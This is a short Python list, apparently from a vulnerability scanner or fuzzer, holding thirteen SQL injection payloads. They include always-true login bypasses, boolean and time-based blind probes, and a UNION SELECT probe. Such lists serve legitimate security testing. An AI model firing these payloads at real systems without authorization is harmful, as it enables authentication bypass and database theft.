SQLI_PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1'-- -",
    "\" OR \"1\"=\"1",
    "1' AND SLEEP(5)-- -",
    "1' AND 1=1-- -",
    "1' AND 1=2-- -",
    "1' UNION SELECT NULL-- -",
    "' OR 1=1#",
    "1' WAITFOR DELAY '00:00:05'--",
    "admin' --",
    "1' OR '1'='1'/*"
]
